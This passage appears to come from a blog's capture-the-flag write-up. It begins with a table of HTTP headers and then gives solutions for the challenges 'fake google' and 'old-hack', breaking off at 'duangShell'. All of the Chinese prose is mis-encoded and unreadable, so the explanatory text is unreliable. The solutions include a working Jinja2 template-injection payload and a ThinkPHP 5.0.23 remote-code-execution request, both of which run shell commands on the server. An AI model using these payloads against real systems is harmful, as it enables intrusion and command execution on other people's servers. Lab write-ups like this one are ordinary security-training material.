align="center">è¯·æ±‚æŸä¸ªç½‘é¡µåº”ç”¨ç¨‹åºä½¿ç”¨è¯¥åè®®å¤´å­—æ®µä¸­æŒ‡å®šçš„æ–¹æ³•ï¼ˆä¸€èˆ¬æ˜¯PUTæˆ–DELETEï¼‰æ¥è¦†ç›–æ‰åœ¨è¯·æ±‚ä¸­æ‰€æŒ‡å®šçš„æ–¹æ³•ï¼ˆä¸€èˆ¬æ˜¯POSTï¼‰ã€‚å½“æŸä¸ªæµè§ˆå™¨æˆ–é˜²ç«å¢™é˜»æ­¢ç›´æ¥å‘é€PUT æˆ–DELETE æ–¹æ³•æ—¶ï¼ˆæ³¨æ„ï¼Œè¿™å¯èƒ½æ˜¯å› ä¸ºè½¯ä»¶ä¸­çš„æŸä¸ªæ¼æ´ï¼Œå› è€Œéœ€è¦ä¿®å¤ï¼Œä¹Ÿå¯èƒ½æ˜¯å› ä¸ºæŸä¸ªé…ç½®é€‰é¡¹å°±æ˜¯å¦‚æ­¤è¦æ±‚çš„ï¼Œå› è€Œä¸åº”å½“è®¾æ³•ç»•è¿‡ï¼‰ï¼Œå¯ä½¿ç”¨è¿™ç§æ–¹å¼ã€‚</td><td align="center"><code>X-HTTP-Method-Override: DELETE</code></td></tr><tr><td align="center">X-ATT-DeviceId[<a href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-22">22]</a></td><td align="center">ä½¿æœåŠ¡å™¨æ›´å®¹æ˜“è§£è¯»AT&amp;Tè®¾å¤‡User-Agentå­—æ®µä¸­å¸¸è§çš„è®¾å¤‡å‹å·ã€å›ºä»¶ä¿¡æ¯ã€‚</td><td align="center"><code>X-Att-Deviceid: GT-P7320/P7320XXLPG</code></td></tr><tr><td align="center">X-Wap-Profile[<a href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-23">23]</a></td><td align="center">é“¾æ¥åˆ°äº’è”ç½‘ä¸Šçš„ä¸€ä¸ªXMLæ–‡ä»¶ï¼Œå…¶å®Œæ•´ã€ä»”ç»†åœ°æè¿°äº†æ­£åœ¨è¿æ¥çš„è®¾å¤‡ã€‚å³ä¾§ä»¥ä¸ºAT&amp;T Samsung Galaxy S2æä¾›çš„XMLæ–‡ä»¶ä¸ºä¾‹ã€‚</td><td align="center"><code>x-wap-profile: http://wap.samsungmobile.com/uaprof/SGH-I777.xml</code></td></tr><tr><td align="center">Proxy-Connection[<a href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-24">24]</a></td><td align="center">è¯¥å­—æ®µæºäºæ—©æœŸè¶…æ–‡æœ¬ä¼ è¾“åè®®ç‰ˆæœ¬å®ç°ä¸­çš„é”™è¯¯ã€‚ä¸æ ‡å‡†çš„è¿æ¥ï¼ˆConnectionï¼‰å­—æ®µçš„åŠŸèƒ½å®Œå…¨ç›¸åŒã€‚</td><td align="center"><code>Proxy-Connection: keep-alive</code></td></tr><tr><td align="center">X-Csrf-Token[<a href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-25">25]</a></td><td align="center">ç”¨äºé˜²æ­¢ <a href="https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0">è·¨ç«™è¯·æ±‚ä¼ªé€ </a>ã€‚ è¾…åŠ©ç”¨çš„å¤´éƒ¨æœ‰ <code>X-CSRFToken</code>[<a href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-26">26]</a> æˆ– <code>X-XSRF-TOKEN</code>[<a href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-27">27]</a></td><td align="center"><code>X-Csrf-Token: i8XNjC4b8KVok4uw5RftR38Wgp2BFwql</code></td></tr></tbody></table><p><strong>å›åº”å­—æ®µ</strong></p><table><thead><tr><th align="center">å­—æ®µå</th><th align="center">è¯´æ˜</th><th align="center">ä¾‹å­</th><th align="center">çŠ¶æ€</th></tr></thead><tbody><tr><td align="center">Access-Control-Allow-Origin</td><td align="center">æŒ‡å®šå“ªäº›ç½‘ç«™å¯å‚ä¸åˆ°è·¨æ¥æºèµ„æºå…±äº«è¿‡ç¨‹ä¸­</td><td align="center"><code>Access-Control-Allow-Origin: *</code></td><td align="center">ä¸´æ—¶</td></tr><tr><td align="center">Accept-Patch[<a href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-28">28]</a></td><td align="center">æŒ‡å®šæœåŠ¡å™¨æ”¯æŒçš„æ–‡ä»¶æ ¼å¼ç±»å‹ã€‚</td><td align="center"><code>Accept-Patch: text/example;charset=utf-8</code></td><td align="center">å¸¸è®¾</td></tr><tr><td align="center">Accept-Ranges</td><td align="center">è¿™ä¸ªæœåŠ¡å™¨æ”¯æŒå“ªäº›ç§ç±»çš„éƒ¨åˆ†å†…å®¹èŒƒå›´</td><td align="center"><code>Accept-Ranges: bytes</code></td><td align="center">å¸¸è®¾</td></tr><tr><td align="center">Age</td><td align="center">è¿™ä¸ªå¯¹è±¡åœ¨ä»£ç†ç¼“å­˜ä¸­å­˜åœ¨çš„æ—¶é—´ï¼Œä»¥ç§’ä¸ºå•ä½</td><td align="center"><code>Age: 12</code></td><td align="center">å¸¸è®¾</td></tr><tr><td align="center">Allow</td><td align="center">å¯¹äºç‰¹å®šèµ„æºæœ‰æ•ˆçš„åŠ¨ä½œã€‚é’ˆå¯¹HTTP/405è¿™ä¸€é”™è¯¯ä»£ç è€Œä½¿ç”¨</td><td align="center"><code>Allow: GET, HEAD</code></td><td align="center">å¸¸è®¾</td></tr><tr><td align="center"><a href="https://zh.wikipedia.org/wiki/%E7%BD%91%E9%A1%B5%E5%BF%AB%E7%85%A7">Cache-Control</a></td><td align="center">å‘ä»æœåŠ¡å™¨ç›´åˆ°å®¢æˆ·ç«¯åœ¨å†…çš„æ‰€æœ‰ç¼“å­˜æœºåˆ¶å‘ŠçŸ¥ï¼Œå®ƒä»¬æ˜¯å¦å¯ä»¥ç¼“å­˜è¿™ä¸ªå¯¹è±¡ã€‚å…¶å•ä½ä¸ºç§’</td><td align="center"><code>Cache-Control: max-age=3600</code></td><td align="center">å¸¸è®¾</td></tr><tr><td align="center">Connection</td><td align="center">é’ˆå¯¹è¯¥è¿æ¥æ‰€é¢„æœŸçš„é€‰é¡¹[<a href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-rfc7230_connection-8">8]</a></td><td align="center"><code>Connection: close</code></td><td align="center">å¸¸è®¾</td></tr><tr><td align="center">Content-Disposition[<a href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-29">29]</a></td><td align="center">ä¸€ä¸ªå¯ä»¥è®©å®¢æˆ·ç«¯ä¸‹è½½æ–‡ä»¶å¹¶å»ºè®®æ–‡ä»¶åçš„å¤´éƒ¨ã€‚æ–‡ä»¶åéœ€è¦ç”¨åŒå¼•å·åŒ…è£¹ã€‚</td><td align="center"><code>Content-Disposition: attachment; filename=&quot;fname.ext&quot;</code></td><td align="center">å¸¸è®¾</td></tr><tr><td align="center">Content-Encoding</td><td align="center">åœ¨æ•°æ®ä¸Šä½¿ç”¨çš„ç¼–ç ç±»å‹ã€‚å‚è€ƒ è¶…æ–‡æœ¬ä¼ è¾“åè®®å‹ç¼© ã€‚</td><td align="center"><code>Content-Encoding: gzip</code></td><td align="center">å¸¸è®¾</td></tr><tr><td align="center">Content-Language</td><td align="center">å†…å®¹æ‰€ä½¿ç”¨çš„è¯­è¨€[<a href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-30">30]</a></td><td align="center"><code>Content-Language: da</code></td><td align="center">å¸¸è®¾</td></tr><tr><td align="center">Content-Length</td><td align="center">å›åº”æ¶ˆæ¯ä½“çš„é•¿åº¦ï¼Œä»¥ å­—èŠ‚ ï¼ˆ8ä½ä¸ºä¸€å­—èŠ‚ï¼‰ä¸ºå•ä½</td><td align="center"><code>Content-Length: 348</code></td><td align="center">å¸¸è®¾</td></tr><tr><td align="center">Content-Location</td><td align="center">æ‰€è¿”å›çš„æ•°æ®çš„ä¸€ä¸ªå€™é€‰ä½ç½®</td><td align="center"><code>Content-Location: /index.htm</code></td><td align="center">å¸¸è®¾</td></tr><tr><td align="center">Content-MD5</td><td align="center">å›åº”å†…å®¹çš„äºŒè¿›åˆ¶ MD5 æ•£åˆ—ï¼Œä»¥ Base64 æ–¹å¼ç¼–ç </td><td align="center"><code>Content-MD5: Q2hlY2sgSW50ZWdyaXR5IQ==</code></td><td align="center">è¿‡æ—¶çš„[<a href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-31">31]</a></td></tr><tr><td align="center">Content-Range</td><td align="center">è¿™æ¡éƒ¨åˆ†æ¶ˆæ¯æ˜¯å±äºæŸæ¡å®Œæ•´æ¶ˆæ¯çš„å“ªä¸ªéƒ¨åˆ†</td><td align="center"><code>Content-Range: bytes 21010-47021/47022</code></td><td align="center">å¸¸è®¾</td></tr><tr><td align="center">Content-Type</td><td align="center">å½“å‰å†…å®¹çš„<a href="https://zh.wikipedia.org/wiki/MIME">MIME</a>ç±»å‹</td><td align="center"><code>Content-Type: text/html; charset=utf-8</code></td><td align="center">å¸¸è®¾</td></tr><tr><td align="center">Date</td><td align="center">æ­¤æ¡æ¶ˆæ¯è¢«å‘é€æ—¶çš„æ—¥æœŸå’Œæ—¶é—´(æŒ‰ç…§ RFC 7231 ä¸­å®šä¹‰çš„â€œè¶…æ–‡æœ¬ä¼ è¾“åè®®æ—¥æœŸâ€æ ¼å¼æ¥è¡¨ç¤º)</td><td align="center"><code>Date: Tue, 15 Nov 1994 08:12:31 GMT</code></td><td align="center">å¸¸è®¾</td></tr><tr><td align="center"><a href="https://zh.wikipedia.org/wiki/HTTP_ETag">ETag</a></td><td align="center">å¯¹äºæŸä¸ªèµ„æºçš„æŸä¸ªç‰¹å®šç‰ˆæœ¬çš„ä¸€ä¸ªæ ‡è¯†ç¬¦ï¼Œé€šå¸¸æ˜¯ä¸€ä¸ª æ¶ˆæ¯æ•£åˆ—</td><td align="center"><code>ETag: &quot;737060cd8c284d8af7ad3082f209582d&quot;</code></td><td align="center">å¸¸è®¾</td></tr><tr><td align="center">Expires</td><td align="center">æŒ‡å®šä¸€ä¸ªæ—¥æœŸ/æ—¶é—´ï¼Œè¶…è¿‡è¯¥æ—¶é—´åˆ™è®¤ä¸ºæ­¤å›åº”å·²ç»è¿‡æœŸ</td><td align="center"><code>Expires: Thu, 01 Dec 1994 16:00:00 GMT</code></td><td align="center">å¸¸è®¾: æ ‡å‡†</td></tr><tr><td align="center">Last-Modified</td><td align="center">æ‰€è¯·æ±‚çš„å¯¹è±¡çš„æœ€åä¿®æ”¹æ—¥æœŸ(æŒ‰ç…§ RFC 7231 ä¸­å®šä¹‰çš„â€œè¶…æ–‡æœ¬ä¼ è¾“åè®®æ—¥æœŸâ€æ ¼å¼æ¥è¡¨ç¤º)</td><td align="center"><code>Last-Modified: Tue, 15 Nov 1994 12:45:26 GMT</code></td><td align="center">å¸¸è®¾</td></tr><tr><td align="center">Link</td><td align="center">ç”¨æ¥è¡¨è¾¾ä¸å¦ä¸€ä¸ªèµ„æºä¹‹é—´çš„ç±»å‹å…³ç³»ï¼Œæ­¤å¤„æ‰€è¯´çš„ç±»å‹å…³ç³»æ˜¯åœ¨ RFC 5988 ä¸­å®šä¹‰çš„</td><td align="center"><code>Link: ; rel=&quot;alternate&quot;</code>[<a href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-google_canonical-32">32]</a></td><td align="center">å¸¸è®¾</td></tr><tr><td align="center"><a href="https://zh.wikipedia.org/wiki/HTTP_Location">Location</a></td><td align="center">ç”¨æ¥ è¿›è¡Œé‡å®šå‘ï¼Œæˆ–è€…åœ¨åˆ›å»ºäº†æŸä¸ªæ–°èµ„æºæ—¶ä½¿ç”¨ã€‚</td><td align="center"><code>Location: http://www.w3.org/pub/WWW/People.html</code></td><td align="center">å¸¸è®¾</td></tr><tr><td align="center">P3P</td><td align="center">ç”¨äºæ”¯æŒè®¾ç½®<a href="https://zh.wikipedia.org/wiki/P3P">P3P</a>ç­–ç•¥ï¼Œæ ‡å‡†æ ¼å¼ä¸ºâ€œ<code>P3P:CP=&quot;your_compact_policy&quot;</code>â€ã€‚ç„¶è€ŒP3Pè§„èŒƒå¹¶ä¸æˆåŠŸï¼Œ[<a href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-33">33]</a>å¤§éƒ¨åˆ†ç°ä»£æµè§ˆå™¨æ²¡æœ‰å®Œæ•´å®ç°è¯¥åŠŸèƒ½ï¼Œè€Œå¤§é‡ç½‘ç«™ä¹Ÿå°†è¯¥å€¼è®¾ä¸ºå‡å€¼ï¼Œä»è€Œè¶³ä»¥ç”¨æ¥æ¬ºéª—æµè§ˆå™¨çš„P3Pæ’ä»¶åŠŸèƒ½å¹¶æˆæƒç»™ç¬¬ä¸‰æ–¹Cookiesã€‚</td><td align="center"><code>P3P: CP=&quot;This is not a P3P policy! ``See http://www.google.com/support/accounts/bin/answer.py?hl=en&amp;answer=151657 for more info.&quot;</code></td><td align="center">å¸¸è®¾</td></tr><tr><td align="center">Pragma</td><td align="center">ä¸å…·ä½“çš„å®ç°ç›¸å…³ï¼Œè¿™äº›å­—æ®µå¯èƒ½åœ¨è¯·æ±‚/å›åº”é“¾ä¸­çš„ä»»ä½•æ—¶å€™äº§ç”Ÿå¤šç§æ•ˆæœã€‚</td><td align="center"><code>Pragma: no-cache</code></td><td align="center">å¸¸è®¾</td></tr><tr><td align="center">Proxy-Authenticate</td><td align="center">è¦æ±‚åœ¨è®¿é—®ä»£ç†æ—¶æä¾›èº«ä»½è®¤è¯ä¿¡æ¯ã€‚</td><td align="center"><code>Proxy-Authenticate: Basic</code></td><td align="center">å¸¸è®¾</td></tr><tr><td align="center"><a href="https://zh.wikipedia.org/wiki/HTTP%E5%85%AC%E9%92%A5%E5%9B%BA%E5%AE%9A">Public-Key-Pins</a>[<a href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-34">34]</a></td><td align="center">ç”¨äºç¼“è§£<a href="https://zh.wikipedia.org/wiki/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB">ä¸­é—´äººæ”»å‡»</a>ï¼Œå£°æ˜ç½‘ç«™è®¤è¯ä½¿ç”¨çš„<a href="https://zh.wikipedia.org/wiki/%E4%BC%A0%E8%BE%93%E5%B1%82%E5%AE%89%E5%85%A8%E5%8D%8F%E8%AE%AE">ä¼ è¾“å±‚å®‰å…¨åè®®</a>è¯ä¹¦çš„æ•£åˆ—å€¼</td><td align="center"><code>Public-Key-Pins: max-age=2592000; pin-sha256=&quot;E9CZ9INDbd+2eRQozYqqbQ2yXLVKB9+xcprMF+44U1g=&quot;;</code></td><td align="center">å¸¸è®¾</td></tr><tr><td align="center">Refresh</td><td align="center">ç”¨äºè®¾å®šå¯å®šæ—¶çš„é‡å®šå‘è·³è½¬ã€‚å³è¾¹ä¾‹å­è®¾å®šäº†5ç§’åè·³è½¬è‡³â€œ<code>http://www.w3.org/pub/WWW/People.html</code>â€ã€‚</td><td align="center"><code>Refresh: 5; url=http://www.w3.org/pub/WWW/People.html</code></td><td align="center">ä¸“åˆ©å¹¶éæ ‡å‡†Netscapeå®ç°çš„æ‰©å±•ï¼Œä½†å¤§éƒ¨åˆ†ç½‘é¡µæµè§ˆå™¨ä¹Ÿæ”¯æŒã€‚</td></tr><tr><td align="center">Retry-After</td><td align="center">å¦‚æœæŸä¸ªå®ä½“ä¸´æ—¶ä¸å¯ç”¨ï¼Œåˆ™ï¼Œæ­¤åè®®å¤´ç”¨æ¥å‘ŠçŸ¥å®¢æˆ·ç«¯æ—¥åé‡è¯•ã€‚å…¶å€¼å¯ä»¥æ˜¯ä¸€ä¸ªç‰¹å®šçš„æ—¶é—´æ®µ(ä»¥ç§’ä¸ºå•ä½)æˆ–ä¸€ä¸ªè¶…æ–‡æœ¬ä¼ è¾“åè®®æ—¥æœŸã€‚ [<a href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-35">35]</a></td><td align="center">Example 1: <code>Retry-After: 120</code>Example 2: <code>Retry-After: Fri, 07 Nov 2014 23:59:59 GMT</code></td><td align="center">å¸¸è®¾</td></tr><tr><td align="center">Server</td><td align="center">æœåŠ¡å™¨çš„åå­—</td><td align="center"><code>Server: Apache/2.4.1 (Unix)</code></td><td align="center">å¸¸è®¾</td></tr><tr><td align="center">Set-Cookie</td><td align="center"><a href="https://zh.wikipedia.org/wiki/Cookie">HTTP cookie</a></td><td align="center"><code>Set-Cookie: UserID=JohnDoe; Max-Age=3600; Version=1</code></td><td align="center">å¸¸è®¾: æ ‡å‡†</td></tr><tr><td align="center">Status</td><td align="center">é€šç”¨ç½‘å…³æ¥å£ åè®®å¤´å­—æ®µï¼Œç”¨æ¥è¯´æ˜å½“å‰è¿™ä¸ªè¶…æ–‡æœ¬ä¼ è¾“åè®®å›åº”çš„ çŠ¶æ€ ã€‚æ™®é€šçš„è¶…æ–‡æœ¬ä¼ è¾“åè®®å›åº”ï¼Œä¼šä½¿ç”¨å•ç‹¬çš„â€œçŠ¶æ€è¡Œâ€ï¼ˆâ€Status-Lineâ€ï¼‰ä½œä¸ºæ›¿ä»£ï¼Œè¿™ä¸€ç‚¹æ˜¯åœ¨ RFC 7230 ä¸­å®šä¹‰çš„ã€‚ [<a href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-36">36]</a></td><td align="center"><code>Status: 200 OK</code></td><td align="center">Not listed as a <a href="http://www.iana.org/assignments/message-headers/message-headers.xml">registered field name</a></td></tr><tr><td align="center"><a href="https://zh.wikipedia.org/wiki/HTTP%E4%B8%A5%E6%A0%BC%E4%BC%A0%E8%BE%93%E5%AE%89%E5%85%A8">Strict-Transport-Security</a></td><td align="center">HTTP ä¸¥æ ¼ä¼ è¾“å®‰å…¨è¿™ä¸€å¤´éƒ¨å‘ŠçŸ¥å®¢æˆ·ç«¯ç¼“å­˜è¿™ä¸€å¼ºåˆ¶ HTTPS ç­–ç•¥çš„æ—¶é—´ï¼Œä»¥åŠè¿™ä¸€ç­–ç•¥æ˜¯å¦é€‚ç”¨äºå…¶å­åŸŸåã€‚</td><td align="center"><code>Strict-Transport-Security: max-age=16070400; includeSubDomains</code></td><td align="center">å¸¸è®¾: æ ‡å‡†</td></tr><tr><td align="center">Trailer</td><td align="center">è¿™ä¸ªå¤´éƒ¨æ•°å€¼æŒ‡ç¤ºäº†åœ¨è¿™ä¸€ç³»åˆ—å¤´éƒ¨ä¿¡æ¯ç”±ç”±<a href="https://zh.wikipedia.org/wiki/%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93%E7%BC%96%E7%A0%81">åˆ†å—ä¼ è¾“ç¼–ç </a>ç¼–ç ã€‚</td><td align="center"><code>Trailer: Max-Forwards</code></td><td align="center">å¸¸è®¾</td></tr><tr><td align="center">Transfer-Encoding</td><td align="center">ç”¨æ¥å°†å®ä½“å®‰å…¨åœ°ä¼ è¾“ç»™ç”¨æˆ·çš„ç¼–ç å½¢å¼ã€‚å½“å‰å®šä¹‰çš„æ–¹æ³•åŒ…æ‹¬ï¼šåˆ†å—ï¼ˆchunkedï¼‰ã€compressã€deflateã€gzipå’Œidentityã€‚</td><td align="center"><code>Transfer-Encoding: chunked</code></td><td align="center">å¸¸è®¾</td></tr><tr><td align="center">Upgrade</td><td align="center">è¦æ±‚å®¢æˆ·ç«¯å‡çº§åˆ°å¦ä¸€ä¸ªåè®®ã€‚</td><td align="center"><code>Upgrade: HTTP/2.0, SHTTP/1.3, IRC/6.9, RTA/x11</code></td><td align="center">å¸¸è®¾</td></tr><tr><td align="center">Vary</td><td align="center">å‘ŠçŸ¥ä¸‹æ¸¸çš„ä»£ç†æœåŠ¡å™¨ï¼Œåº”å½“å¦‚ä½•å¯¹æœªæ¥çš„è¯·æ±‚åè®®å¤´è¿›è¡ŒåŒ¹é…ï¼Œä»¥å†³å®šæ˜¯å¦å¯ä½¿ç”¨å·²ç¼“å­˜çš„å›åº”å†…å®¹è€Œä¸æ˜¯é‡æ–°ä»åŸå§‹æœåŠ¡å™¨è¯·æ±‚æ–°çš„å†…å®¹ã€‚</td><td align="center"><code>Vary: *</code></td><td align="center">å¸¸è®¾</td></tr><tr><td align="center">Via</td><td align="center">å‘ŠçŸ¥ä»£ç†æœåŠ¡å™¨çš„å®¢æˆ·ç«¯ï¼Œå½“å‰å›åº”æ˜¯é€šè¿‡ä»€ä¹ˆé€”å¾„å‘é€çš„ã€‚</td><td align="center"><code>Via: 1.0 fred, 1.1 example.com (Apache/1.1)</code></td><td align="center">å¸¸è®¾</td></tr><tr><td align="center">Warning</td><td align="center">ä¸€èˆ¬æ€§çš„è­¦å‘Šï¼Œå‘ŠçŸ¥åœ¨å®ä½“å†…å®¹ä½“ä¸­å¯èƒ½å­˜åœ¨é”™è¯¯ã€‚</td><td align="center"><code>Warning: 199 Miscellaneous warning</code></td><td align="center">å¸¸è®¾</td></tr><tr><td align="center">WWW-Authenticate</td><td align="center">è¡¨æ˜åœ¨è¯·æ±‚è·å–è¿™ä¸ªå®ä½“æ—¶åº”å½“ä½¿ç”¨çš„è®¤è¯æ¨¡å¼ã€‚</td><td align="center"><code>WWW-Authenticate: Basic</code></td><td align="center">å¸¸è®¾</td></tr><tr><td align="center">X-Frame-Options[<a href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-37">37]</a></td><td align="center"><a href="https://zh.wikipedia.org/wiki/%E7%82%B9%E5%87%BB%E5%8A%AB%E6%8C%81">ç‚¹å‡»åŠ«æŒ</a>ä¿æŠ¤ï¼š<code>deny</code>ï¼šè¯¥é¡µé¢ä¸å…è®¸åœ¨ frame ä¸­å±•ç¤ºï¼Œå³ä½¿æ˜¯åŒåŸŸåå†…ã€‚<code>sameorigin</code>ï¼šè¯¥é¡µé¢å…è®¸åŒåŸŸåå†…åœ¨ frame ä¸­å±•ç¤ºã€‚<code>allow-from *uri*</code>ï¼šè¯¥é¡µé¢å…è®¸åœ¨æŒ‡å®šuriçš„ frame ä¸­å±•ç¤ºã€‚<code>allowall</code>ï¼šå…è®¸ä»»æ„ä½ç½®çš„frameæ˜¾ç¤ºï¼Œéæ ‡å‡†å€¼ã€‚</td><td align="center"><code>X-Frame-Options: deny</code></td><td align="center">è¿‡æ—¶çš„[<a href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-38">38]</a></td></tr></tbody></table><p><strong>å¸¸è§çš„éæ ‡å‡†å›åº”å­—æ®µ</strong></p><table><thead><tr><th align="center">å­—æ®µå</th><th align="center">è¯´æ˜</th><th align="center">ç¤ºä¾‹</th></tr></thead><tbody><tr><td align="center">X-XSS-Protection[<a href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-39">39]</a></td><td align="center">è·¨ç«™è„šæœ¬æ”»å‡» ï¼ˆXSSï¼‰è¿‡æ»¤å™¨</td><td align="center"><code>X-XSS-Protection: 1; mode=block</code></td></tr><tr><td align="center">Content-Security-Policy, <em>X-Content-Security-Policy</em>, <em>X-WebKit-CSP</em>[<a href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-40">40]</a></td><td align="center"><a href="https://zh.wikipedia.org/wiki/%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5">å†…å®¹å®‰å…¨ç­–ç•¥</a>å®šä¹‰ã€‚</td><td align="center"><code>X-WebKit-CSP: default-src &#39;self&#39;</code></td></tr><tr><td align="center">X-Content-Type-Options[<a href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-41">41]</a></td><td align="center">å”¯ä¸€å…è®¸çš„æ•°å€¼ä¸ºâ€nosniffâ€ï¼Œé˜²æ­¢ <a href="https://zh.wikipedia.org/wiki/Internet_Explorer">Internet Explorer</a> å¯¹æ–‡ä»¶è¿›è¡ŒMIMEç±»å‹å—…æ¢ã€‚è¿™ä¹Ÿå¯¹ <a href="https://zh.wikipedia.org/wiki/Google_Chrome">Google Chrome</a> ä¸‹è½½æ‰©å±•æ—¶é€‚ç”¨ã€‚[<a href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-42">42]</a></td><td align="center"><code>X-Content-Type-Options: nosniff</code></td></tr><tr><td align="center">X-Powered-By[<a href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-43">43]</a></td><td align="center">è¡¨æ˜ç”¨äºæ”¯æŒå½“å‰ç½‘é¡µåº”ç”¨ç¨‹åºçš„æŠ€æœ¯ï¼ˆä¾‹å¦‚ï¼šPHPï¼‰ï¼ˆç‰ˆæœ¬å·ç»†èŠ‚é€šå¸¸æ”¾ç½®åœ¨ X-Runtime æˆ– X-Version ä¸­ï¼‰</td><td align="center"><code>X-Powered-By: PHP/5.4.0</code></td></tr><tr><td align="center">X-UA-Compatible[<a href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-44">44]</a></td><td align="center">æ¨èæŒ‡å®šçš„æ¸²æŸ“å¼•æ“ï¼ˆé€šå¸¸æ˜¯å‘åå…¼å®¹æ¨¡å¼ï¼‰æ¥æ˜¾ç¤ºå†…å®¹ã€‚ä¹Ÿç”¨äºæ¿€æ´» Internet Explorer ä¸­çš„ <a href="https://zh.wikipedia.org/wiki/Google_Chrome_Frame">Chrome Frame</a>ã€‚</td><td align="center"><code>X-UA-Compatible: IE=EmulateIE7</code> <code>X-UA-Compatible: IE=edge</code> <code>X-UA-Compatible: Chrome=1</code></td></tr><tr><td align="center">X-Content-Duration[<a href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-45">45]</a></td><td align="center">æŒ‡å‡ºéŸ³è§†é¢‘çš„é•¿åº¦ï¼Œå•ä½ä¸ºç§’ã€‚åªå—Geckoå†…æ ¸æµè§ˆå™¨æ”¯æŒã€‚</td><td align="center"><code>X-Content-Duration: 42.666</code></td></tr></tbody></table><h3 id="fake-google"><a href="#fake-google" class="headerlink" title="fake google"></a>fake google</h3><p>æŸ¥çœ‹æºç å‘ç°qaq,è®¿é—®æç¤ºssti</p><p><img src="/2020/03/21/BJDCTF-2rd-writeup/TIM%E6%88%AA%E5%9B%BE20200321184958.png"></p><p>ç›´æ¥ç”¨vulhubä¸Šçš„payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">&#x27;catch_warnings&#x27;</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">for</span> b <span class="keyword">in</span> c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;cat /flag&quot;).read()&#x27;</span>) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p>å°±èƒ½å¾—åˆ°flag</p><h3 id="old-hack"><a href="#old-hack" class="headerlink" title="old-hack"></a>old-hack</h3><p>æç¤ºthinkphp5ï¼Œ5.0.23 RCEçš„payloadå¯ä»¥è¯»flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;index.php?s&#x3D;captcha</span><br><span class="line"></span><br><span class="line">#å‘½ä»¤æ‰§è¡Œ</span><br><span class="line">POSTï¼š_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;get[]&#x3D;cat &#x2F;flag</span><br></pre></td></tr></table></figure><h3 id="duangShell"><a href="#duangShell" class="headerlink" title="duangShell"></a>duangShell</h3><p>æ‰“å¼€æç¤ºswp,è®¿é—®<code>.index.php.swp</code>ï¼Œä¸‹è½½ä¸‹æ¥ <code>vi 